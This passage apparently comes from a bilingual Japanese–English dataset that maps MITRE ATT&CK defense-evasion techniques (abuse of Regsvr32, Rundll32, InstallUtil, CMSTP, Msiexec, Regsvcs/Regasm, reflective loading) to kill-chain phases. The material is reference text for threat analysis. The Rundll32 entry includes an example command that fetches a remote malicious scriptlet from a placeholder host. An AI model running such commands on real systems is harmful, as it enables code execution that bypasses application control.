Regsvr32.exeの悪意のある使用は、Windowsが通常の操作にRegsvr32.exeを使用することによる許可リストや誤検知のために、Regsvr32.exeプロセスによって実行されロードされたモジュールの実行を監視しない可能性のあるセキュリティツールをトリガーすることを回避する可能性があります。Regsvr32.exeはまた、ユーザー権限でDLLを実行するためのCOMスクリプトレットをロードする機能を使用して、アプリケーション制御を具体的にバイパスするためにも使用できます。Regsvr32.exeはネットワークおよびプロキシ対応であるため、呼び出し中に引数として外部Webサーバー上のファイルへのURL（Uniform Resource Locator）を渡すことにより、スクリプトをロードできます。COMオブジェクトは実際には登録されず実行されるだけなので、このメソッドはレジストリに変更を加えません。(引用: LOLBAS Regsvr32) このテクニックのこのバリエーションは、しばしば「Squiblydoo」と呼ばれ、政府を標的とするキャンペーンで使用されています。(引用: Carbon Black Squiblydoo Apr 2016)(引用: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exeは、[コンポーネントオブジェクトモデルハイジャック](https://attack.mitre.org/techniques/T1546/015)を介して永続性を確立するために使用されるCOMオブジェクトを登録するために利用することもできます。(引用: Carbon Black Squiblydoo Apr 2016)","Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)

Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \""Squiblydoo\"" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.004,InstallUtil,InstallUtil,"攻撃者はInstallUtilを使用して、信頼できるWindowsユーティリティを介してコードの実行をプロキシする可能性があります。InstallUtilは、.NETバイナリで指定された特定のインストーラーコンポーネントを実行することにより、リソースのインストールとアンインストールを可能にするコマンドラインユーティリティです。(引用: MSDN InstallUtil) InstallUtilバイナリは、Microsoftによってデジタル署名され、Windowsシステムの.NETディレクトリ（<code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code>および<code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>）にある場合があります。

InstallUtilはまた、<code>[System.ComponentModel.RunInstaller(true)]</code>属性で装飾されたクラスを実行するバイナリ内の属性を使用して、アプリケーション制御をバイパスするために使用される場合があります。(引用: LOLBAS Installutil)","Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.

InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.011,Rundll32,Rundll32,"攻撃者はrundll32.exeを悪用して、悪意のあるコードの実行をプロキシする可能性があります。直接実行する（つまり[共有モジュール](https://attack.mitre.org/techniques/T1129)）のではなくrundll32.exeを使用すると、通常の操作からの許可リストや誤検知のためにrundll32.exeプロセスの実行を監視しない可能性のあるセキュリティツールをトリガーすることを回避できる場合があります。Rundll32.exeは一般的にDLLペイロードの実行に関連付けられています（例：<code>rundll32.exe {DLL名, DLL関数}</code>）。

Rundll32.exeは、文書化されていないshell32.dll関数<code>Control_RunDLL</code>および<code>Control_RunDLLAsUser</code>を介して[コントロールパネル](https://attack.mitre.org/techniques/T1218/002)アイテムファイル（.cpl）を実行するためにも使用できます。.cplファイルをダブルクリックすると、rundll32.exeも実行されます。(引用: Trend Micro CPL) 例えば、[ClickOnce](https://attack.mitre.org/techniques/T1127/002)はRundll32.exeを介してプロキシできます。

Rundll32は、JavaScriptなどのスクリプトを実行するためにも使用できます。これは、次のような構文を使用して行うことができます：<code>rundll32.exe javascript:\""\\..\\mshtml,RunHTMLApplication \"";document.write();GetObject(\""script:https[:]//www[.]example[.]com/malicious.sct\"")\""</code> この動作は、Poweliksなどのマルウェアで使用されていることが確認されています。(引用: This is Security Command Line Confusion)

敵対者はまた、rundll32.exeがDLL関数名をロードする方法を悪用して、分析から悪意のあるコードを隠蔽しようとするかもしれません。さまざまな文字セットのWindows互換性サポートの一環として、rundll32.exeは指定された関数をロードする前に、まずワイド/Unicode、次にANSI文字対応の関数をチェックします（例：コマンド<code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>が与えられた場合、rundll32.exeはまず<code>ExampleFunctionW</code>、それが失敗した場合は<code>ExampleFunctionA</code>を実行しようとし、その後<code>ExampleFunction</code>をロードします）。したがって、敵対者は、複数の同一のエクスポート関数名を作成し、無害なものに<code>W</code>や<code>A</code>を追加することで、悪意のあるコードを隠蔽する可能性があります。(引用：Attackify Rundll32.exe Obscurity）(引用：Github NoRunDll）DLL関数は、序数でエクスポートして実行することもできます（例：<code>rundll32.exe file.dll,#1</code>）。

さらに、攻撃者は[マスカレード](https://attack.mitre.org/techniques/T1036)テクニック（DLLファイル名、ファイル拡張子、または関数名の変更など）を使用して、悪意のあるペイロードの実行をさらに隠蔽する可能性があります。(引用: rundll32.exe defense evasion)","Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\""\\..\\mshtml,RunHTMLApplication \"";document.write();GetObject(\""script:https[:]//www[.]example[.]com/malicious.sct\"")\""</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).

Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.009,Regsvcs/Regasm,Regsvcs/Regasm,"攻撃者はRegsvcsとRegasmを悪用して、信頼できるWindowsユーティリティを介してコードの実行をプロキシする可能性があります。RegsvcsとRegasmは、.NET [コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)（COM）アセンブリを登録するために使用されるWindowsコマンドラインユーティリティです。どちらもMicrosoftによってデジタル署名されている可能性のあるバイナリです。(引用: MSDN Regsvcs)(引用: MSDN Regasm)

両方のユーティリティは、登録または登録解除の前に実行する必要があるコードを指定するためにバイナリ内の属性を使用することにより、アプリケーション制御をバイパスするために使用される場合があります。それぞれ<code>[ComRegisterFunction]</code>または<code>[ComUnregisterFunction]</code>です。登録属性と登録解除属性を持つコードは、プロセスが不十分な権限で実行され実行に失敗した場合でも実行されます。(引用: LOLBAS Regsvcs)(引用: LOLBAS Regasm)","Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.003,CMSTP,CMSTP,"攻撃者はCMSTPを悪用して、悪意のあるコードの実行をプロキシする可能性があります。Microsoft Connection Manager Profile Installer（CMSTP.exe）は、Connection Managerサービスプロファイルをインストールするために使用されるコマンドラインプログラムです。(引用: Microsoft Connection Manager Oct 2009) CMSTP.exeはインストール情報ファイル（INF）をパラメータとして受け入れ、リモートアクセス接続に利用されるサービスプロファイルをインストールします。

攻撃者は、悪意のあるコマンドに感染したINFファイルをCMSTP.exeに提供する可能性があります。(引用: Twitter CMSTP Usage Jan 2018) [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”と同様に、CMSTP.exeはリモートサーバーからDLL (引用: MSitPros CMSTP Aug 2017) やCOMスクリプトレット(SCT)をロードして実行するために悪用される可能性があります。(引用: Twitter CMSTP Jan 2018)(引用: GitHub Ultimate AppLocker Bypass List)(引用: Endurant CMSTP July 2018) この実行は、CMSTP.exeがMicrosoftによって署名されている可能性のある正当なバイナリであるため、AppLockerやその他のアプリケーション制御防御もバイパスする可能性があります。

CMSTP.exeはまた、自動昇格COMインターフェイスを介して悪意のあるINFから任意のコマンドを実行するために、[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)を悪用するためにも使用できます。(引用: MSitPros CMSTP Aug 2017)(引用: GitHub Ultimate AppLocker Bypass List)(引用: Endurant CMSTP July 2018)","Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.

CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.007,Msiexec,Msiexec,"攻撃者はmsiexec.exeを悪用して、悪意のあるペイロードの実行をプロキシする可能性があります。Msiexec.exeはWindowsインストーラーのコマンドラインユーティリティであり、したがって一般的にインストールパッケージ（.msi）の実行に関連付けられています。(引用: Microsoft msiexec) Msiexec.exeバイナリはMicrosoftによってデジタル署名されている場合もあります。

攻撃者はmsiexec.exeを悪用して、ローカルまたはネットワークアクセス可能なMSIファイルを起動する可能性があります。Msiexec.exeはDLLも実行できます。(引用: LOLBAS Msiexec)(引用: TrendMicro Msiexec Feb 2018) Windowsシステム上で署名済みかつネイティブである可能性があるため、msiexec.exeはその潜在的な悪用を考慮しないアプリケーション制御ソリューションをバイパスするために使用できます。<code>AlwaysInstallElevated</code>ポリシーが有効になっている場合、Msiexec.exeの実行はSYSTEM権限に昇格される可能性もあります。(引用: Microsoft AlwaysInstallElevated 2018)","Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.

Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1620,リフレクティブコードローディング,Reflective Code Loading,"攻撃者は、悪意のあるペイロードの実行を隠蔽するために、プロセスにコードをリフレクティブにロードする可能性があります。リフレクティブローディングには、ディスク上のファイルパス（例：[共有モジュール](https://attack.mitre.org/techniques/T1129)）に裏打ちされたスレッドやプロセスを作成するのではなく、プロセスのメモリ内で直接ペイロードを割り当ててから実行することが含まれます。

リフレクティブにロードされたペイロードは、コンパイル済みバイナリ、匿名ファイル（RAMにのみ存在する）、またはファイルレス実行可能コードのスタブ（位置独立シェルコードなど）である場合があります。(引用: Introducing Donut)(引用: S1 Custom Shellcode Tool)(引用: Stuart ELF Memory)(引用: 00sec Droppers)(引用: Mandiant BYOL) 例えば、[PowerShell](https://attack.mitre.org/techniques/T1059/001)によって実行される`Assembly.Load()`メソッドは、実行中のプロセスに生のコードをロードするために悪用される可能性があります。(引用: Microsoft AssemblyLoad)

